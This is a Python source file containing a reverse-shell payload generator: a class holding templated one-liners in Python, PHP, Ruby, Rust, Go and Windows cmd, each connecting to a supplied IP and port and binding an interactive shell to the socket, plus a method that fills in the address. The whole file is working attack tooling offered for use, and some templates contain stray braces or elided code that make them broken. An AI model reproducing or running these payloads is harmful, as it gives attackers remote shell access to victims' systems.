from typing import Dict, List


class ReverseShellCommands:
    def __init__(self):
        self.commands: Dict[str, Dict[str, List[str]]] = {
            1: {
                'name': 'Python Linux only IPv4',
                'command': [
                    "export RHOST='{ip}';export RPORT={port}};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
                    "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
                    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}}\",{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                    "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}}\",{port}}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
                ]
            },
            2: {
                'name': 'Python Linux only IPv4 (No Spaces)',
                'command': [
                    "python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
                    "python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                    "python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
                ]
            },
            3: {
                'name': 'Python Linux only IPv4 (No Spaces, Shortened)',
                'command': [
                    "python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"{ip}\",{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
                    "python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"{ip}\",{port}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
                    "python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"{ip}\",{port}));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'"
                ]
            },
            4: {
                'name': 'Python Linux only IPv6',
                'command': [
                    "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{ip}\",{port},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
                ]
            },
            5: {
                'name': 'Python Linux only IPv6 (No Spaces)',
                'command': [
                    "python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{ip}\",{port},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
                ]
            },
            6: {
                'name': 'Python Linux only IPv6 (No Spaces, Shortened)',
                'command': [
                    "python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"{ip}\",{port},0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'"
                ]
            },
            7: {
                'name': 'Windows only (Python2)',
                'command': [
                    "python.exe -c \"(lambda __y, __g, __contextlib: ...s.connect(('{ip}', {port})), ...subprocess.Popen(['\\windows\\system32\\cmd.exe'], ...\""
                ]
            },
            8: {
                'name': 'Windows only (Python3)',
                'command': [
                    "python.exe -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{ip}',{port}));threading.Thread(target=exec,args=('while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)',globals()),daemon=True).start();threading.Thread(target=exec,args=('while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)',globals())).start()\""
                ]
            },
            9: {
                'name': 'PHP',
                'command': [
                    'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});`/bin/sh -i <&3 >&3 2>&3`;\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");\'',
                    'php -r \'$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\''
                ]
            },
            10: {
                'name': 'Ruby',
                'command': [
                    'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
                    'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}\'',
                    'ruby -rsocket -e \'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
                ]
            },
            11: {
                'name': 'Rust',
                'command': [
                    'use std::net::TcpStream;',
                    'use std::os::unix::io::{AsRawFd, FromRawFd};',
                    'use std::process::{Command, Stdio};',
                    'fn main() {',
                    '    let s = TcpStream::connect("{ip}:{port}").unwrap();',  #Dynamic IP and port
                    '    let fd = s.as_raw_fd();',
                    '    Command::new("/bin/sh")',
                    '        .arg("-i")',
                    '        .stdin(unsafe { Stdio::from_raw_fd(fd) })',
                    '        .stdout(unsafe { Stdio::from_raw_fd(fd) })',
                    '        .stderr(unsafe { Stdio::from_raw_fd(fd) })',
                    '        .spawn()',
                    '        .unwrap()',
                    '        .wait()',
                    '        .unwrap();',
                    '}'
                ]
            },
            12: {
                'name': 'Golang',
                'command': [
                    "echo 'package main;import \"os/exec\";import \"net\";func main() {c, _ := net.Dial(\"tcp\", \"{ip}:{port}\"); cmd := exec.Command(\"/bin/sh\"); cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c; cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
                ]
            },
        }

    def get_command(self, option, port, ip):
        command_info = self.commands.get(option)
        if command_info:
            # Returns all the commands
            formatted_commands = []
            for command_template in command_info['command']:  # You might want to allow the user to select which command or handle different scenarios
                command_filled = command_template.replace('{ip}', ip).replace('{port}', str(port))
                formatted_commands.append(command_filled)
            return formatted_commands
        else:
            return None

    def list_commands(self):
        return self.commands
